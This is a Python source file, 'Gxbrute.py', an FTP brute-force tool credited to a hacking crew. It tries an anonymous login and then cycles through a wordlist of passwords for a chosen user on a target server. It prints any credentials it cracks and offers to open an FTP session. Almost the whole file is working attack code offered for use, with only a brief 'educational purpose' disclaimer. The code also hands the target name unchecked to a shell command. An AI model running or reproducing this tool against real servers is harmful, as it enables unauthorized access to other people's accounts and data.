#!/usr/bin/env python
#================================================ #
# Gxbrute.py v.0.1 (beta)                         #
# Author : Rio79                                  #
# Site   : http://shine-of-bara.blogspot.com      #
# Thanks to : 1. Allah SWT n_n                    #
#             2. Gxrg Crew                        #
#             3. Gunslinger                       #
#=============================(c)Copyleft 04/02===#

# gxrg linux team
# ray16, abi, mad, vodka, cgilla, virus, isal90, choober, Azure, stupid, acha
# zake, d_kun, bagoel, etc
# 
# DESC: 
# This is a python script for Ftp-Bruteforce.

# license: Under the GNU General Public License

# NOTES:
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
#
import sys, ftplib, time, os

if sys.platform == 'linux-i386' or sys.platform == 'linux2':
	cls='clear'
elif sys.platform == 'dos' or sys.platform == 'win32':
	cls='cls'
else:
	cls='unknow'
	
def help1():
	os.system(cls)
	print("""\x1b[33m
 ___                      ___            _             _   
/  _> __   _ _  ___  ___ | . \ _ _  ___ <_> ___  ___ _| |_ 
| <_/\\ \/| '_>/ . ||___||  _/| '_>/ . \| |/ ._>/ | ' | |  
`____//\_\|_|  \_. |     |_|  |_|  \___/| |\___.\_|_. |_|  
               <___'                   <__'	
               	
\x1b[0m	""")
	print("[!]Before run this program, you must first create a wordlist ...!!\n")
	print(" # python " + sys.argv[0] + " -u <user> -t <server> -f <wordlist>")
	print(" # python "+ sys.argv[0] + " -u " + "anonymous " + "-t " + "ftp.gnome.org " + " -f " + "passwd.txt")
	print(" # python "+ sys.argv[0] + " -u " + "gxrg " + "-t " + "localhost " + " -f " + "passwd.txt\n")
	
try:
	login1=str(sys.argv[2])
	target=str(sys.argv[4])
	make_file=open(sys.argv[6],'r')
	if sys.argv[1] != '-u' or sys.argv[3] != '-t' or sys.argv[5] != '-f' or len(sys.argv) != 7 :
		help1()
		sys.exit(1)
except:
	help1()
	sys.exit()
	
class ftp:
	user=''
	server=''
	file=''
	def anonymouse(self):
		f=ftplib.FTP(str(self.server))
		f.login("anonymous","anonymous")
		print("\t +---------------------------------------+")
		print("\t  [+] Server    : " +self.server)
		print("\t  [+] Username  : anonymous")
		print("\t  [+] Password  : None")
		print("\t  [+] Status    : Anonymous Server")
		print("\t +---------------------------------------+\n")
		login=raw_input("[!] Do you want login to Ftp [Y/n] ? ")
		if login == 'Y' or login == 'y':
			os.system("ftp "+self.server)				
		elif login == 'N' or login == 'n':
			print('''
[+]Finnishing Program...
[+]Thanks for use my program.. :)
[+]visit : http://rndc.or.id/
			''')
			exit
		else:
			print("\n[!] Commend not found...!!!")
			exit
	def brute(self):
		try:
			print("\n[+] Connecting to server... done")
			print("[+] At %s" %time.asctime())
			time.sleep(1)
			print("[+] Getting Password...\n")
			for i in self.file.read().split():
				print("[*] Trying word: " + i)
				try:
					f=ftplib.FTP(self.server)
					f.login(self.user,i)
					print("[*] Password \t\t\t\x1b[33m[Ok]\x1b[0m \n")
					print("\t +---------------------------------------+")
					print("\t  [+] Server    : " +self.server)
					print("\t  [+] Username	: " +self.user)
					print("\t  [+] Password	: " +i)
					print("\t  [+] Status    : Private Server")
					print("\t +---------------------------------------+\n")
					login=raw_input("[!] Do you want login to Ftp [Y/n] ? ")
					try:
						if login == 'Y' or login == 'y':
							os.system("ftp "+self.server)
							break				
						elif login == 'N' or login == 'n':
							print('''
[+]Finnishing Program...
[+]Thanks for use my program.. :)
[+]visit : http://rndc.or.id/
			''')
							break 
						else:
							print("\n[!] Commend not found...!!!")
							break
					except:
						break 
						sys.exit()
				except:
					print("[*] Password \t\t\t\x1b[31m[Fail]\x1b[0m\n" )
		
		except KeyboardInterrupt:
			print("\n[!] Program Cancel...")
			
f1=ftp()
f1.server=target
f1.user=login1
f1.file=make_file
try:
	f1.anonymouse()
except:
	f1.brute()
